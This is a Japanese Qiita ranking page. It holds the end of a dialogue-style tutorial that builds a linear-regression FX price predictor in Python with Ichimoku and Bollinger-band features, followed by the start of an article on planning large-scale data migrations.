<span class="c1"># 転換線 = （過去(para1)日間の高値 + 安値） ÷ 2</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">1</span><span class="p">))]</span> <span class="c1"># 列の追加</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">para1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)):</span>
    <span class="n">tmp_high</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">para1</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">tmp_low</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">para1</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">max</span><span class="p">(</span><span class="n">tmp_high</span><span class="p">)</span> <span class="o">+</span> <span class="n">np</span><span class="o">.</span><span class="n">min</span><span class="p">(</span><span class="n">tmp_low</span><span class="p">))</span> <span class="o">/</span> <span class="mi">2</span> 

<span class="c1"># 基準線 = （過去(para2)日間の高値 + 安値） ÷ 2</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">1</span><span class="p">))]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">para2</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)):</span>
    <span class="n">tmp_high</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">para2</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">tmp_low</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">para2</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">max</span><span class="p">(</span><span class="n">tmp_high</span><span class="p">)</span> <span class="o">+</span> <span class="n">np</span><span class="o">.</span><span class="n">min</span><span class="p">(</span><span class="n">tmp_low</span><span class="p">))</span> <span class="o">/</span> <span class="mi">2</span> 

<span class="c1"># 先行スパン1 = ｛ （転換値+基準値） ÷ 2 ｝を(para2)日先にずらしたもの</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">1</span><span class="p">))]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)</span><span class="o">-</span><span class="n">para2</span><span class="p">):</span>
    <span class="n">tmp</span> <span class="o">=</span><span class="p">(</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">10</span><span class="p">])</span> <span class="o">/</span> <span class="mi">2</span> 
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">para2</span><span class="p">,</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span>


<span class="c1"># 先行スパン2 = ｛ （過去(para3)日間の高値+安値） ÷ 2 ｝を(para2)日先にずらしたもの</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">1</span><span class="p">))]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">para3</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)</span><span class="o">-</span><span class="n">para2</span><span class="p">):</span>
    <span class="n">tmp_high</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">para3</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">tmp_low</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">para3</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">para2</span><span class="p">,</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">max</span><span class="p">(</span><span class="n">tmp_high</span><span class="p">)</span> <span class="o">+</span> <span class="n">np</span><span class="o">.</span><span class="n">min</span><span class="p">(</span><span class="n">tmp_low</span><span class="p">))</span> <span class="o">/</span> <span class="mi">2</span> 
</pre></div></div>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 25日ボリンジャーバンド（±1, 2シグマ）を追加します</span>
<span class="n">parab</span> <span class="o">=</span> <span class="mi">25</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">4</span><span class="p">))]</span> <span class="c1"># 列の追加</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">parab</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)):</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">parab</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> <span class="o">+</span> <span class="mf">1.0</span><span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">std</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> 
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> <span class="o">-</span> <span class="mf">1.0</span><span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">std</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> 
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> <span class="o">+</span> <span class="mf">2.0</span><span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">std</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> 
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> <span class="o">-</span> <span class="mf">2.0</span><span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">std</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> 
</pre></div></div>

<p>これで最初は終値だけから予測していたのが、<br>
終値1本、移動平均線4本、一目均衡表4本、ボリンジャー4本の合計13本になったよ。</p>

<p>すぐるさん、ということは13×25で、え～っと、<br>
325個の入力データで線形モデルを作るってことだね。<br>
ここで200日移動平均線を使用するから、最初のプログラムも200日以降を学習データにしたんだね。</p>

<p>その通りだよ。<br>
じゃあ最初と同じように、各日ごとに325個が列方向に並ぶように変換してもらえるかな。</p>

<p>よし、カタカタ・・・</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 説明変数となる行列Xを作成します</span>
<span class="n">day_ago</span> <span class="o">=</span> <span class="mi">25</span> <span class="c1"># 何日前までのデータを使用するのかを設定</span>
<span class="n">num_sihyou</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span><span class="mi">4</span> <span class="c1"># 終値1本、MVave4本、itimoku4本、ボリンジャー4本</span>

<span class="n">X</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span> <span class="n">day_ago</span><span class="o">*</span><span class="n">num_sihyou</span><span class="p">))</span> 

<span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">num_sihyou</span><span class="p">):</span> <span class="c1"># 日にちごとに横向きに並べる</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">day_ago</span><span class="p">):</span>
        <span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="n">day_ago</span><span class="o">*</span><span class="n">s</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data2</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)</span><span class="o">-</span><span class="n">i</span><span class="p">,</span><span class="n">s</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</pre></div></div>

<p>あとは1回目と同じように線形回帰を実行してもらえるかな。</p>

<p>うん、カタカタ・・・</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 2017年のデータで予想し、グラフで予測具合を見る</span>

<span class="n">Y_pred</span> <span class="o">=</span> <span class="n">linear_reg_model</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">X_test</span><span class="p">)</span> <span class="c1"># 予測する</span>

<span class="n">result</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">Y_pred</span><span class="p">)</span> <span class="c1"># 予測</span>
<span class="n">result</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'Y_pred'</span><span class="p">]</span>
<span class="n">result</span><span class="p">[</span><span class="s1">'Y_test'</span><span class="p">]</span> <span class="o">=</span> <span class="n">Y_test</span>

<span class="n">sns</span><span class="o">.</span><span class="n">set_style</span><span class="p">(</span><span class="s1">'darkgrid'</span><span class="p">)</span> 
<span class="n">sns</span><span class="o">.</span><span class="n">regplot</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="s1">'Y_pred'</span><span class="p">,</span> <span class="n">y</span><span class="o">=</span><span class="s1">'Y_test'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">result</span><span class="p">)</span> <span class="c1">#plotする</span>


<span class="c1"># 正答率を計算</span>
<span class="n">success_num</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_pred</span><span class="p">)):</span>
    <span class="k">if</span> <span class="n">Y_pred</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">*</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">success_num</span><span class="o">+=</span><span class="mi">1</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"予測日数："</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_pred</span><span class="p">))</span><span class="o">+</span><span class="s2">"、正解日数："</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">success_num</span><span class="p">)</span><span class="o">+</span><span class="s2">"正解率："</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">success_num</span><span class="o">/</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_pred</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span><span class="p">))</span>
</pre></div></div>

<p>予測日数：214、正解日数：124、正解率：57.943925233644855</p>

<p><a href="https://camo.qiitausercontent.com/fa5b86e22832c62e339ba9f29bd78e88a134cdd2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f31363364616263382d346264342d316438362d323033662d6363336661376665313133372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/fa5b86e22832c62e339ba9f29bd78e88a134cdd2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f31363364616263382d346264342d316438362d323033662d6363336661376665313133372e706e67" alt="nobitaFX_3_4.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/163dabc8-4bd4-1d86-203f-cc3fa7fe1137.png"></a></p>

<p>正答率が58%になったよ！！</p>

<p>うん、いい感じだね。</p>

<p>よし、合計も計算してみるぞ！</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 2017年の予測結果の合計を計算ーーーーーーーーー</span>
<span class="c1"># 前々日終値に比べて前日終値が高い場合は、買いとする</span>
<span class="n">sum_2017</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_test</span><span class="p">)):</span> <span class="c1"># len()で要素数を取得しています</span>
    <span class="k">if</span> <span class="n">Y_pred</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">sum_2017</span> <span class="o">+=</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sum_2017</span> <span class="o">-=</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"2017年の利益合計：</span><span class="si">%1.3lf</span><span class="s2">"</span> <span class="o">%</span><span class="n">sum_2017</span><span class="p">)</span> 


<span class="c1"># 予測結果の総和グラフを描くーーーーーーーーー</span>
<span class="n">total_return</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_test</span><span class="p">))</span>

<span class="k">if</span> <span class="n">Y_pred</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;=</span><span class="mi">0</span><span class="p">:</span> <span class="c1"># 2017年の初日を格納</span>
    <span class="n">total_return</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">Y_test</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">total_return</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="n">Y_test</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)):</span> <span class="c1"># 2017年の2日以降を格納</span>
    <span class="k">if</span> <span class="n">Y_pred</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">total_return</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">total_return</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">total_return</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">total_return</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="n">plt</span><span class="o">.</span><span class="n">plot</span><span class="p">(</span><span class="n">total_return</span><span class="p">)</span>
</pre></div></div>

<p>2017年の利益合計：22.089</p>

<p><a href="https://camo.qiitausercontent.com/c95fb1fc7dd0cfdb623eaaa8dc6db56566a6b54d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f66383438613636372d343734332d323063382d666565392d6234303263623433366235612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c95fb1fc7dd0cfdb623eaaa8dc6db56566a6b54d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f66383438613636372d343734332d323063382d666565392d6234303263623433366235612e706e67" alt="nobitaFX_3_5.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/f848a667-4743-20c8-fee9-b402cb436b5a.png"></a></p>

<p>すぐるさん、22でプラスになったよ！！<br>
やったー！！</p>

<p>ときおり減るときもあるけど、右肩上がりに増えているね。<br>
完成したね！これが線形回帰でのFXの予測プログラムだよ。<br>
<a href="https://github.com/Nobita-FX/Nobita-FX/blob/master/program/NobitaFX_3_linear_regression_2.ipynb" rel="nofollow noopener" target="_blank">本記事の掲載コードはこちら</a></p>

<p>+22ってことは、1000通貨だったら、22,000円、1万通貨なら22万円、10万通貨なら220万円儲かるってことだよね！<br>
でも、手数料は考えなくていいの？</p>

<p>1日1回の取引なら、手数料はほぼ無視できると考えていいよ。<br>
正確には手数料（本当はスプレッド）が0.3銭（0.003円）だとすると、約200日の取引で0.6くらいになるから、<br>
22-0.6 が、正しい値だよ。</p>

<p>よし！じゃあこれでiPhone Xが買えるぞ！！</p>

<p>・<br>
・<br>
・</p>

<p>あれ？すぐるさんもこの方法でFXをやっているの？</p>

<p>いや、僕は使っていないよ。<br>
これは、今回のび太くんの勉強のために作成したプログラムだからね。</p>

<p>のび太くん、線形回帰でFX（為替）を予測するプログラムなんて、20年以上も前からあるものなんだよ。<br>
今回の場合、正解率も60%弱だし。<br>
使えないことはないけど、最近の進歩した機械学習・AI技術を使えばもっと良いものが作れるよ。</p>

<p>たしかに最近、囲碁でAIがプロの方に勝ったニュースとか聞いたよ。<br>
それもFXに使えるの？</p>

<p>もちろんさ。<br>
囲碁のAIはディープラーニングや強化学習をベースにしているよ。<br>
あまりFXに固執して欲しくないけど、ディープラーニングや強化学習は、FXを含め様々な場面で使用できるよ。</p>

<p>でも、AIとか良く分からないや・・・<br>
難しいんでしょ？</p>

<p>大丈夫だよ。<br>
今回みたいに、ひとつずつゆっくり勉強して、実際に実装してみれば、<br>
のび太くんにもマスターできるよ。</p>

<p>僕が書いたAIのまとめ記事があるよ。<br>
昔に一気に書いたから微妙なところもあるけど、まずはこちらをおすすめするよ。</p>

<p><a href="https://camo.qiitausercontent.com/1867598280cf09b4aa362747dc44a7d37987cb30/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39623230383564352d386433342d333532622d633936652d3165383732396261373161312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/1867598280cf09b4aa362747dc44a7d37987cb30/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39623230383564352d386433342d333532622d633936652d3165383732396261373161312e706e67" alt="nobitaFX_3_6.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/9b2085d5-8d34-352b-c96e-1e8729ba71a1.png"></a></p>

<p><a href="http://neuro-educator.com/?s=AI%E3%82%B7%E3%83%AA%E3%83%BC%E3%82%BA" rel="nofollow noopener" target="_blank">AI関連の記事一覧：【図解：3分で解説】 人工知能・AIの歴史｜機械学習、ディープラーニングとは、等</a></p>

<p>うん、読んでみるよ。<br>
FXはともかく、もっとうまく未来を予測できるプログラムを作ってみたい！！</p>

<p>よし！！その意気だ、のび太くん。<br>
じゃあ次回は、別の機械学習手法を学びながら、FXプログラムをさらに改善していこう！</p>

<p>・<br>
・<br>
・</p>

<p>【完】のび太と学ぶ「機械学習」シーズン1 ～線形回帰～</p>

<p>次回、シーズン2へ続く（のか・・・？）</p>

<hr>

<p>以上、ご一読いただきありがとうございます。</p>

<p>「ここが分かりにくいよ～不明」など、気軽にコメントください。<br>
可能な限り、加筆修正して、分かりやすくしたいです。</p>

<p>また、記事やコードの間違え、改善点、不明点、感想なども<br>
気軽にコメントいただければ幸いです。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">94位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>94</kbd>
		<a target="_blank" href="https://qiita.com/yoshi-taka/items/35d3ed126f4d45e9662d">大規模データ移行の失敗を防ぎたい。計画やプログラム、インフラの注意点と、ありがちなこと</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-22<br />23:27:21</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/37384.html">yoshi-taka</a>(37件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/37384/profile-images/1473687407">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[MySQL]</b> <b>[DB]</b> <b>[データベース]</b> <b>[データ移行]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>仕事柄、大規模なデータ移行を何度か経験してきました。</p>

<p>データ移行、特にDBのマイグレーションでもなく、<br>
システム移行のときのようなデータ構造の変更を伴う際には気をつけることがたくさんあります。</p>

<p>クラウドではだいぶ楽になりますが、<br>
特にオンプレミスで検討せざるを得ない皆さんに気をつけないといけない点を共有します。</p>

<h1>
<span id="スケジューリング編" class="fragment"></span><a href="#%E3%82%B9%E3%82%B1%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AA%E3%83%B3%E3%82%B0%E7%B7%A8"><i class="fa fa-link"></i></a>スケジューリング編</h1>

<h2>
<span id="最初から検討し始めよう" class="fragment"></span><a href="#%E6%9C%80%E5%88%9D%E3%81%8B%E3%82%89%E6%A4%9C%E8%A8%8E%E3%81%97%E5%A7%8B%E3%82%81%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>最初から検討し始めよう</h2>

<p>開発プロジェクトにおいて<a href="http://itpro.nikkeibp.co.jp/article/COLUMN/20080303/295281/" rel="nofollow noopener" target="_blank">システム移行だけで4割の工数がかかる</a>と言われています。<br>
しかし、新規システム部分の開発で頭が一杯になっていると、重要度の割に移行部分が後回しにされがちです。<br>
移行用プログラム、移行用サーバ手配はもちろん、新規、既存システムへの影響も検討しないといけません。<br>
できればプロジェクト開始時から人をアサインして計画を立てていきましょう。<br>
移行自体が一つの開発プロジェクト相当です。頑張りましょう。</p>

<h3>
<span id="ありがちなこと" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>後半になって移行計画を立てたら、計画上どう考えても間に合わないので延期になった</li>
<li>サービスインまでの計画に移行用プログラム開発の時間がなく、結果バグだらけ、移行作業の属人化などなど</li>
<li>移行部分の各リソースが確保できず、緊急で手配して予算超過した</li>
</ul>

<h2>
<span id="移行タイミングを分割しよう" class="fragment"></span><a href="#%E7%A7%BB%E8%A1%8C%E3%82%BF%E3%82%A4%E3%83%9F%E3%83%B3%E3%82%B0%E3%82%92%E5%88%86%E5%89%B2%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>移行タイミングを分割しよう</h2>

<p>規模が大きい場合、一度に全部移行するより、数回にわけて徐々に移行しましょう。<br>
まとめて一回にしてしまうと失敗時のリカバリに時間がかかります。<br>
データに限らず一般論として、規模が大きなものはできるだけ分割して移行したほうがよいです。</p>

<p>ビッグバン方式は控えめに。</p>

<h3>
<span id="ありがちなこと-1" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-1"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>トラブルでシステム停止時間が当初想定の数倍になった</li>
<li>大きすぎてそもそも計画が立てることが難しい</li>
</ul>

<h2>
<span id="切り戻し計画を立てよう" class="fragment"></span><a href="#%E5%88%87%E3%82%8A%E6%88%BB%E3%81%97%E8%A8%88%E7%94%BB%E3%82%92%E7%AB%8B%E3%81%A6%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>切り戻し計画を立てよう</h2>

<p>残念ながらトラブルは発生します。すぐに戻せるよう計画を立てましょう。<br>
いつまで頑張るか、あらかじめ決めておき、その時間を過ぎたら躊躇なく戻しましょう。</p>

<p>人生諦めが肝心です。</p>

<h3>
<span id="ありがちなこと-2" class="fragment"></span><a href="#%E3%81%82%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%81%93%E3%81%A8-2"><i class="fa fa-link"></i></a>ありがちなこと</h3>

<ul>
<li>トラブル対応がダラダラと伸びて、影響が大きくなる</li>
<li>関係者への周知が漏れる</li>
<li>移行中に更新されたデータが切り戻しの際に漏れてデータ欠損発生</li>
</ul>

<h2>
<span id="リハーサルしよう" class="fragment"></span><a href="#%E3%83%AA%E3%83%8F%E3%83%BC%E3%82%B5%E3%83%AB%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>リハーサルしよう</h2>

<p>新、旧両方の仕様が必要で、移行用ツールも準備しないといけないデータ移行は課題が山積みです。<br>
本番同等のリハーサルで課題を潰しましょう。</p>

<p>最低2回はしたほうがよいです。1回目は問題洗い出し、2回目は1回目の問題が解決できたか。<br>
切り戻しについてもリハーサルすることを忘れないように。</p>

<h3>
